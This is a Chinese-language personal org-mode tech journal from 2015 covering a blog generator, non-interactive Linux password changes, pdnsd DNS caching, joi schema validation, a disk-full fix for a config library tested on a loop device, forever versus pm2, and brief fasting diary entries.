  参考 [[https://github.com/renard/o-blog][o-blog]] 的代码顺利完成任务，代码量很少不到40行。貌似 o-blog 很多解析org-mode的代码都是手写的，org-mode 支持一些便捷的API，可以减少很多代码量。

  接下来要完的任务是org-mode格式的日记内容html化。
* DONE 第二个任务以及移植 o-blog 主要功能顺利完成                    :ediary:
  CLOSED: [2015-06-03 Wed 14:45]

  o-blog 的相关特性进行了一番取舍：去掉了云标签独立页面，去掉了年/月发布列表页，去掉了最新文章侧边栏，去掉了文章页面的上一文章、下一文章链接，以及选择直接在标签侧边栏高亮相关标签，新增按标签订阅，新增主页。

  接下来还有首页的页面需要按时间顺序排列，另外最好1号页码表示最旧的文章，这样发表新文章后文章所在的页码不会变来变去不利于收藏。

* DONE ediary已基本可用正式在个人博客中启用                          :ediary:
  CLOSED: [2015-06-08 Mon 11:39]

  经过上周末的一翻努力，参考 [[http://medium.com/][medium]] 的风格，对布局进行彻底的调整：

  - 使用三层组织方式：category > tag > article

  - article 去除干扰阅读的元素：标签云，网址中去除了时间信息

  - category 放到一级菜单中，支持按 category 订阅
    
  - 移植 o-blog 中的sitemap功能

  接下来的任务是对主页进行正式支持，目前是手工拷贝了 category 的第一页做为首页，后面需要改为直接把 category 的第一页发布为首页，以及显示方面的BUG修复。

* DONE ediary支持主页以及完成国际化（i18n）支持                      :ediary:
  CLOSED: [2015-06-09 Tue 15:04]

  - 完成主页支持
    
    通过在配置文件中添加主页选项 =config.site.home= ，支持把某一个页面通过拷贝做为主页 =/index.html= 。

  - 完成国际化支持
    
    按照文章 [[https://research.linagora.com/blog/?p=37][A strategy for i18n in node.js server templates]] 的建议，选用 [[https://github.com/mashpie/i18n-node][i18n-node]] 做为国际化方案，顺利完成英文及中文简体的支持。

  接下来要简化安装配置，并提供相关文档。

* DONE linux非交互方式修改用户密码                                    :linux:
  CLOSED: [2015-06-16 Tue 17:35]

  linux下的 =passwd= 命令是交互式运行的（密码需要由用户使用键盘输入），后台程序如果要改用户密码需要一定的技巧。

  如：以下命令可以将 =root= 帐号的密码改为 =123456=

  #+begin_src sh
    (echo '123456'; sleep 1; echo '123456') | passwd 'root' > /dev/null
  #+end_src

  但是，此时也不好判断密码是否改成功了，需要验证一下。

  linux 系统的密码编码（不可逆）后存储在 /etc/shadow（以前是 /etc/passwd） 文件里。

  参考文章《[[http://www.xinotes.net/notes/note/1833/][Check Linux user password in C]] 》编写了以下程序用于非交互式修改密码：

  [[file:../static/change_password.c][change_password.c]]

  编译：
  #+begin_src sh
    gcc -g change_password.c -o change_password -lcrypt
  #+end_src

  运行：
  #+begin_src sh
    ./change_password root 123456
  #+end_src

  参考：

  - [[http://tldp.org/HOWTO/Shadow-Password-HOWTO-2.html][Why shadow your passwd file?]]

* DONE 轻断食日（2015-6-16）                                             :轻断食:
  CLOSED: [2015-06-16 Tue 18:52]

  今天是第一次进行轻断食，昨天晚上10点多吃过水果后到现在还没有吃过东西，喝了一天的茶，除了偶尔觉得饿得发慌，一切安好，工作没有疲劳感效率很高，马上要吃晚饭了，希望不要吃得太多，按要求一天只能吃600卡的，等下可别吃超了哦。

  现在肚子有饿的感觉，但是又感觉肚子有点涨，搞不清楚自已到底是不是真饿了。

  现在刚好70公斤，希望慢慢瘦下来吧，过了今天明天就解放了。

* DONE 使用Pdnsd缓存域名解析结果加快上网速度                        :linux:dns:
  CLOSED: [2015-06-23 Tue 18:56]

  - 频繁的域名解析容易导致超时出错

    在执行 =opkg-cl update= 或 =yaourt -Syua= 命令更新系统软件信息时，容易因为频繁的域名解析而导致更新速度奇慢甚至是超时出错，通过将要访问的域名添加到 =/etc/hosts= 中，可以立即解决这个问题。考虑到服务器IP可能会换，使用 =/etc/hosts= 非长久之计。

  - 缓存域名解析结果

    更好的办法是缓存域名解析结果，一般来说后台服务程序可以通过缓存域名解析结果加快后继请求的处理，但是对于像 =opkg-cl= 、 =yaourt= 之类的工具程序，由于运行一次就退出了，要实现缓存域名解析结果就显得有点小题大作了，最好是在系统底层来实现，而不是每个应用程序都实现这个功能。

    [[http://members.home.nl/p.a.rombouts/pdnsd/][Pdnsd]] 就是这样一款开源DNS代理服务程序，它安装在客户机上，对于客户端应用程序来说，它是DNS服务程序，对于真正的DNS服务来说它是DNS客户端程序。

  - [[http://members.home.nl/p.a.rombouts/pdnsd/][Pdnsd]] 安装
    
    #+begin_src sh
      yaourt -S pdnsd
    #+end_src
    
  - [[http://members.home.nl/p.a.rombouts/pdnsd/][Pdnsd]] 运行

    #+begin_src sh
      sudo systemctl enable pdnsd
      sudo systemctl start pdnsd
    #+end_src

  - 客户机DNS设置

    修改 =/etc/resolv.conf= 为如下内容：

    #+begin_example
      nameserver 127.0.0.1
    #+end_example

    对于 Archlinux =/etc/resolv.conf= 是由 =resolvconf= 工具生成，直接修改后随时可能被覆盖，可以修改 =/etc/resolvconf.conf= 将以下配置行取消注释：
    #+begin_example
      # name_servers=127.0.0.1
    #+end_example

    然后重新生成 =/etc/resolv.conf= 配置文件：
    #+begin_src sh
      sudo resolvconf -u
    #+end_src
    
  - 看看效果
    
    多次执行下面的命令，可以感觉到后几次明显比第一次快，这就是DNS缓存在起作用。

    #+begin_src sh
      nslookup www.google.com
    #+end_src

  - 适合国内环境的配置（仅供参考）

    将 =/etc/pdnsd.conf= 配置文件修改为以下内容：

    #+begin_example
      global {
          perm_cache=1024;
          cache_dir="/var/cache/pdnsd";
          pid_file = /var/run/pdnsd.pid;
          run_as="pdnsd";
          server_ip = 127.0.0.1;
          status_ctl = on;
          query_method=udp_tcp;
          min_ttl=15m;
          max_ttl=1d;
          timeout=10;
          neg_domain_pol=on;
          udpbufsize=1024;
      }

      server {
          label = "root-servers";
          root_server = discover;
          randomize_servers = on;
          ip = 114.114.114.114,
               223.5.5.5,
               114.114.115.115,
               223.6.6.6;
          timeout = 5;
          uptest = query;
          interval = 30m;
          ping_timeout = 50;
          purge_cache = off;
          exclude = .localdomain;
          policy = included;
          preset = off;
      }

      source {
          owner=localhost;
          serve_aliases=on;
          file="/etc/hosts";
      }

      rr {
          name=localhost;
          reverse=on;
          a=127.0.0.1;
          owner=localhost;
          soa=localhost,root.localhost,42,86400,900,86400,86400;
      }
    #+end_example

    重启 [[http://members.home.nl/p.a.rombouts/pdnsd/][Pdnsd]] 生效配置：

    #+begin_src sh
      sudo systemctl restart pdnsd
    #+end_src
    
  - 配置pdnsd使用dhcp分配的dns服务器
    
    往往dhcp提供的dns服务器是最快的（它可能也做了缓存），用到了本地域名的情况下必须使用dhcp提供的dns服务器，
    如果将dns服务器写死在pdnsd.conf，切换网络（如从公司回到家里）就上不了网了，其实 =resolvconf= 对 =pdnsd= 提供了支持。

    参考 =man resolvconf= 将 =/etc/resolvconf.conf= 改为
    #+begin_example
      name_servers=127.0.0.1
      pdnsd_conf=/etc/pdnsd.conf
    #+end_example

    删掉 =/etc/pdnsd.conf= 中的所有 =server= 配置块。
    
    重启 =NetworkManager= 生效配置
    #+begin_src sh
      sudo systemctl restart NetworkManager
    #+end_src
    
    现在 =/etc/pdnsd.conf= 中的 =server= 配置块将由 =resolvconf= 来提供。

  - 参考

    《[[http://venmos-com.qiniudn.com/blog/2013/06/19/pdnsd/][用Pdnsd快速打造无污染高速缓存DNS服务器]]》
* DONE 使用node.js的对象模式验证模块joi引入强类型                      :node:
  CLOSED: [2015-07-13 Mon 18:44]

  - 弱类型的Javascript

    Javascript是一门弱类型的语言，定义变量不需要指定类型，可以为同一个变量赋任意类型的值。误用类型不会报错，而结果会让你大吃一惊：

    #+begin_example
      > "1" + 1
      '11'
      > if ("false") { console.log("yes") } else { console.log("no"); }
      yes
      undefined
      > 
    #+end_example
    
    redis中很多数据结构取出时都是字符串值（如：set、hash），调用方需要自行将它转换成正确的类型（如：Boolean、Date、Number），如果不转换成正确的类型会导致冗长的代码，如Boolean类型：

    #+begin_src js
      if ((String(model.stoped) == 'true')) {
          // Do something when stoped.
      }
    #+end_src

    如果手工转换成正确的类型肯定要写很多样板代码了。
    
  - 对象模式验证模块 [[https://github.com/hapijs/joi#anydefaultvalue-description][joi]]

    有很多的ORM（ Object Relational Mapping 对象关系映射）库都能够实现强类型的数据模型，但是它们都相当的复杂，支持各种各样的数据库后端，支持一对一、一对多、多对多等数据关系，但是很少支持分表分库，我们的系统一般是数据模型简单但要考虑用户量大了横向扩展，所以一开始就进行了分表分库，无法使用重型的ORM。

    如果有一个能够自动根据模式（Schema）定义对值进行类型转换的库，一定会非常有用。
    
    [[https://github.com/hapijs/joi#anydefaultvalue-description][joi]] 一个Javascript对象模式描述语言以及验证（Object schema description language and validator for JavaScript objects）的库，它可以完成对象类型转换以及合法性验证。

  - [[https://github.com/hapijs/joi#anydefaultvalue-description][joi]] 的用法示例

    #+begin_src js
      var joi = require('joi');
      var redis = require('redis');

      var client = redis.createClient(6379, '127.0.0.1');

      var User = function (options) {
          if (! options) {
              options = {};
          }

          this.id = options.id || 0;
          this.name = options.name || '';
          this.male = options.male || true;
          this.birthday = options.birthday;
      };

      User.schema = joi.object().keys({
          id: joi.number().integer().min(1),
          name: joi.string().required(),
          male: joi.boolean().default(true),
          birthday: joi.date().required()
      });

      User.find = function (id, callback) {
          client.hgetall("user:" + id, function (err, value) {
              if (err) {
                  return callback(err);
              } else if (! value) {
                  return callback(new Error("User not found"));
              }

              joi.validate(value, User.schema, callback);
          });
      };

      User.prototype.save = function (callback) {
          var value = {};
          for(var fieldName in this) {
              if (typeof(this[fieldName]) != 'function') {
                  value[fieldName] = this[fieldName];
              }
          }
          joi.validate(value, User.schema, function (err, validatedValue) {
              if (err) {
                  return callback(err);
              }

              client.hmset("user:" + validatedValue.id, validatedValue, callback);
          });
      };


      var user = new User({
          id: 1,
          name: "txf",
          male: true,
          birthday: new Date("1983-03-22")
      });

      user.save(function (err) {
          if (err) {
              console.error("user save error(" + err.toString() + ")");
              client.quit();
              return;
          }

          console.info("user saved");

          User.find(user.id, function (err, user) {
              client.quit();
              if (err) {
                  console.error("user find error(" + err.toString() + ")");
                  return;
              }

              console.log("user found: " + JSON.stringify(user));
          });
      });
    #+end_src

    运行结果：

    #+begin_src js
      user saved
      user found: {"id":1,"name":"txf","male":true,"birthday":"1983-03-22T00:00:00.000Z"}
    #+end_src
* DONE 轻断食日（2015-7-17）                                            :轻断食:
  CLOSED: [2015-07-17 Fri 14:28]

  今天是轻断食日，昨天晚上10点多吃过水果后到现在还没有吃过东西，上午起得很晚，最近工作太累了。中午忘点餐干脆断食算了，下一顿要到18点的晚餐，已经泡好了下午茶，肚子有点撑（为什么不觉得很饿呢？），有时候又会觉得肚子有点饿得慌，但仔细一体会其实是最近因为工作有点焦虑。

  现在是66.5公斤，主要是肚子瘦了些，继续加油。
* DONE config库避免磁盘满时配置文件被截断                           :linux:c:
  CLOSED: [2015-07-20 Mon 17:35]

  [[https://github.com/tangxinfa/config][config]] 库在实际使用过程中发现一个问题：磁盘满时写配置文件可能导致配置文件被清空（文件大小为0）。
  
  想到两种方案：
  
  - 写-替换

    先写到一个临时文件，写成功后替换目标文件，这是由linux下重命名（rename）文件的原子性保证的。由于我们是通过对配置文件加锁的方式支持多进程访问的，可以对配置文件使用独立的锁文件，一想起到配置文件目录里将出现一大堆锁文件，胃就不舒服。
    
  - 预分配空间

    先确保文件拥有足够的空间再写入。虽然不是原子性的，但已经能够解决问题。我比较倾向于这个方案。

** 通过预分配空间方式安全写文件算法

   - 如果当前文件过小（不足以容纳新内容），在文件尾部通过追加占位字符（\0）直到文件大小合适

   - 写入新内容

   - 将过多的空间截掉

   具体实现参见： [[https://github.com/tangxinfa/config/commit/5ed686fc42c3356658d67d2d3bb59d3435f8c68f][5ed686f Fix bug: config file content missing when disk full]] .

** 测试

*** 创建模拟磁盘目录 /mnt/disk

    先确保存在 =/dev/loop*= 设备，如果不存在先尝试挂载 =loop= 内核模块

    #+begin_src sh
     sudo modprobe loop
    #+end_src

    如果还是没有 =loop= 设备，可能是最近进行了系统升级，重启后再试。

    创建模拟磁盘（/mnt/disk）：

    #+begin_example
      $ sudo dd if=/dev/zero of=~/Examples/disk.img bs=8M count=1
      $ sudo losetup /dev/loop0 ~/Examples/disk.img
      $ sudo parted /dev/loop0
      GNU Parted 3.2
      Using /dev/loop0
      Welcome to GNU Parted! Type 'help' to view a list of commands.
      (parted) mklabel gpt
      Warning: The existing disk label on /dev/loop0 will be destroyed and all data on
      this disk will be lost. Do you want to continue?
      Yes/No? yes
      (parted) mkpart primary 0MB 8MB
      Warning: The resulting partition is not properly aligned for best performance.
      Ignore/Cancel? Ignore
      (parted) print
      Model: Loopback device (loopback)
      Disk /dev/loop0: 8389kB
      Sector size (logical/physical): 512B/512B
      Partition Table: gpt
      Disk Flags: 

      Number  Start   End     Size    File system  Name  Flags
       1      17.4kB  8372kB  8354kB

      (parted) quit
      $ sudo mkfs.ext4 /dev/loop0p1
      $ sudo mkdir /mnt/disk
      $ sudo mount /dev/loop0p1 /mnt/disk
   #+end_example

*** 修复前

    磁盘空间不足写配置导致配置文件被损坏

    #+begin_example
      $ sudo ~/Opensource/config/config /mnt/disk/test.json set name libconfig
      name: libconfig
      $ sudo dd if=/dev/zero of=/mnt/disk/other.data bs=1 obs=1 count=100000000
      dd: error writing ‘/mnt/disk/other.data’: No space left on device
      6821889+0 records in
      6821888+0 records out
      6821888 bytes (6.8 MB) copied, 7.44769 s, 916 kB/s
      dd: error writing ‘/mnt/disk/other.data’: No space left on device
      6821889+0 records in
      6821888+0 records out
      6821888 bytes (6.8 MB) copied, 7.53017 s, 906 kB/s
      $ sudo ~/Opensource/config/config /mnt/disk/test.json set data "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
      config: write: No space left on device
      config: save config file(/mnt/disk/test.json) failed
      data: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
      $ sudo ~/Opensource/config/config /mnt/disk/test.json get name
      config: get items(name,,,,,) from config file(/mnt/disk/test.json) failed
    #+end_example

*** 修复后

    磁盘空间不足写配置不会对配置文件造成实质影响

    #+begin_example
      $ sudo ~/Opensource/config/config /mnt/disk/test.json set name libconfig
      name: libconfig
      $ sudo dd if=/dev/zero of=/mnt/disk/other.data bs=1 obs=1 count=100000000
      dd: error writing ‘/mnt/disk/other.data’: No space left on device
      6821889+0 records in
      6821888+0 records out
      6821888 bytes (6.8 MB) copied, 7.6254 s, 895 kB/s
      $ sudo ~/Opensource/config/config /mnt/disk/test.json set data "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
      config: write: No space left on device
      config: save config file(/mnt/disk/test.json) failed
      data: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
      $ sudo ~/Opensource/config/config /mnt/disk/test.json get name
      name: libconfig
    #+end_example

*** 清除测试环境
   
    #+begin_src sh
      sudo umount /dev/loop0p1
      sudo losetup -d /dev/loop0
      sudo rmdir /mnt/disk
      sudo rm ~/Examples/disk.img
    #+end_src

** 参考

   《[[http://www.oschina.net/translate/reliable-file-updates-with-python][使用 Python 进行稳定可靠的文件操作]]》
* DONE 后台服务监护工具：forever与pm2                                  :node:pm2:
  CLOSED: [2015-07-25 Sat 00:15]

  使用后台服务监护工具有很多好处：

  - 程序崩溃时自动拉起
    
  - 程序日志聚合（你的系统有多个模块或多个进程的时候很有必要）

  - 代码更新时自动重启服务
    
  node.js下最常用的后台服务监护工具有：[[https://github.com/nodejitsu/forever][forever]] 、[[https://github.com/Unitech/pm2][pm2]] 。

  [[https://github.com/nodejitsu/forever][forever]] 先出现，[[https://github.com/Unitech/pm2][pm2]] 后出现功能更丰富，下面是特性对比：

  |---------------------+---------+-----|
  | Feature             | Forever | PM2 |
  |---------------------+---------+-----|
  | Keep Alive          | ✔       | ✔   |
  | Coffeescript        | ✔       |     |
  | Log aggregation     |         | ✔   |
  | API                 |         | ✔   |
  | Terminal monitoring |         | ✔   |
  | Clustering          |         | ✔   |
  | JSON configuration  |         | ✔   |
  |---------------------+---------+-----|

  我在3个项目中使用 [[https://github.com/nodejitsu/forever][forever]] ，多次重启出错后，决定转向 [[https://github.com/Unitech/pm2][pm2]] ，目前我已经在两个较小的项目中成功使用 [[https://github.com/Unitech/pm2][pm2]] 。

** [[https://github.com/nodejitsu/forever][forever]]
   
   - 安装

     #+begin_src js
       npm install -g forever
     #+end_src
     
   - 配置

     启动脚本
     =start.sh=
     #+begin_src sh
       #!/bin/bash

       export PATH=$PATH:`pwd`/node/bin:`pwd`/../node/bin:`pwd`/node_modules/forever/bin:/usr/local/node/bin
       export NODE_ENV=${NODE_ENV:-production}
       export NODE_CONFIG_DIR=`pwd`/config

       SCRIPT=`pwd`/src/index.js
       LOGFILE=`pwd`/run.log

       running=`forever list | grep "$SCRIPT" | grep -v grep | wc -l`

       if [ $running -lt 1 ]; then
           forever start --spinSleepTime=10000 --killSignal=SIGINT --pidFile=`pwd`/run.pid -l $LOGFILE -a -w --watchDirectory=`pwd`/src --watchIgnore=".svn/*" "$SCRIPT"
           echo -e "\nRunning."
       else
           echo -e "\nAlready running."
       fi

       forever list | grep "$SCRIPT"
     #+end_src
     
     停止脚本
     =stop.sh=
     #+begin_src sh
       #!/bin/bash

       export PATH=$PATH:`pwd`/node/bin:`pwd`/../node/bin:`pwd`/node_modules/forever/bin:/usr/local/node/bin

       SCRIPT=`pwd`/src/index.js

       forever stop "$SCRIPT"
     #+end_src
     
     重启脚本     
     =restart.sh=
     #+begin_src sh
       #!/bin/bash

       export PATH=$PATH:`pwd`/node/bin:`pwd`/../node/bin:`pwd`/node_modules/forever/bin:/usr/local/node/bin

       SCRIPT=`pwd`/src/index.js

       forever restart "$SCRIPT" || ./start.sh
     #+end_src

   - 用法
     
     启动
     
     #+begin_src sh
       ./start.sh
     #+end_src

     停止
     
     #+begin_src sh
       ./stop.sh
     #+end_src

     重启
     
     #+begin_src sh
       ./restart.sh
     #+end_src

   - 缺点

     + 程序退出过程中的日志无法捕获

       参见：[[https://github.com/foreverjs/forever/issues/385#issuecomment-115163346][no logging after graceful shutdown #385]]
       
       应该是forever通过信号通知程序退出后，不再捕获程序的日志输出，程序退出的这段时间内日志丢失。

       一个补丁方案：程序收到forever的退出信号后将日志直接写到日志文件（正常情况下是由forever捕获程序的错误输出写日志文件）。

     + 重启可能失败

       代码更新后，forever会发信号重启进程，但是程序始终重启不成功，出现大量下面的日志：
       #+begin_example
         Error: bind EADDRINUSE
       #+end_example
       
       怀疑跟node.js的cluster中master自动拉起slave的行为相冲突，此时只有一个forever实例在运行，这种情况占比很高。
       
       另外crontab中调用start.sh也可能和forever相冲突，当node全退出时，可能启动多个forever实例，这种情况占比稍低。

       另外一种情况是node.js出问题了CPU及内存100%占用，此时普通的kill杀不死（必须得kill -9），forever误认为已成功结束node.js进程，
       然后拉起新的进程。

     + 未内置支持开机启动

       可以直接放在crontab每分钟调用一次 =start.sh= 来实现，万一连forever进程都挂了，可以全部拉起来。
       开机启动不内置则意味着一百个人有一百种做法，带来不必要的争议。

     + 允许程序同时启动多个实例
       
       forever未对启动的程序进行唯一性标识，导致程序可能意外启动多个实例，多个实例之间往往相冲突，降低了系统可用性。

       而由程序自已来实现单实例运行是很困难的，forever会不断地拉起退出的多余副本。

     + 未内置支持cluster以及优雅重启

       部署代码重启程序过程中会停止服务几秒钟。

** [[https://github.com/Unitech/pm2][pm2]]

   - 安装

     #+begin_src js
       npm install -g pm2
     #+end_src
     
   - 配置
     
     以 [[https://github.com/tangxinfa/upload-fiddle][upload-fiddle]] 项目为例。

     统一配置其它脚本需要的环境变量
     =.bashrc=
     #+begin_src sh
       export PATH=`pwd`/node/bin:`pwd`/../node/bin:`pwd`/node_modules/pm2/bin:/usr/local/node/bin:$PATH
       export NODE_ENV=${NODE_ENV:-production}
       export NODE_CONFIG_DIR=`pwd`/config
       export APP_NAME="upload-fiddle"
       export APP_SCRIPT=`pwd`/src/index.js
     #+end_src

     启动脚本
     =start.sh=
     #+begin_src sh
       #!/bin/bash

       source .bashrc
       pm2 --node-args="--harmony" -n "$APP_NAME" start "$APP_SCRIPT" -i 0 --watch "`pwd`/src/*.js"
     #+end_src

     停止脚本
     =stop.sh=
     #+begin_src sh
       #!/bin/bash

       source .bashrc
       pm2 --node-args="--harmony" stop "$APP_NAME"
     #+end_src

     重启脚本
     =restart.sh=
     #+begin_src sh
       #!/bin/bash

       source .bashrc
       pm2 --node-args="--harmony" restart "$APP_NAME"
     #+end_src
     
   - 用法
     
     启动
     
     #+begin_src sh
       ./start.sh
     #+end_src

     停止
     
     #+begin_src sh
       ./stop.sh
     #+end_src

     重启
     
     #+begin_src sh
       ./restart.sh
     #+end_src

   - 缺点
     
     + 程序退出过程中的日志无法捕获？

       不一定。使用 =pm2 stop= 会有同样的问题，但是pm2支持优雅退出（ =pm2 gracefulReload= ），此时不但退出过程中的日志能够正常捕获，而且可以实现服务0停机时间。
       
     + 重启可能失败

       是的。=pm2 restart= 并没有采用激进的措施（kill -9）确保旧进程结束。重现步骤：用gdb调试运行中的node进程（gdb node <PID>后不执行任何gdb命令），然后用pm2 restart重启服务，此时旧的进程杀不死，新的进程被创建。
       
     + 允许程序同时启动多个实例
       
       pm2对启动的程序进行了唯一性标识，但是它将启动的信息保存在了当前用户的home目录下（~/.pm2），所以使用其它帐号时还是有能够启动多个程序实例，对于这一点forever也存在同样的问题。
       
       对于服务器来说，多帐号是常态，应该默认防止这种问题发生。

** 程序写日志相关

   用c/c++写日志的时候我一般都会使用日志库，如：[[http://logging.apache.org/log4cxx/index.html][log4cxx]] 、[[https://github.com/HardySimpson/zlog][zlog]] ，这些日志库容易使用而且很稳定，支持将日志写到文件或控制台，支持按大小、日期分割日志文件，支持限定日志文件数、占用空间。

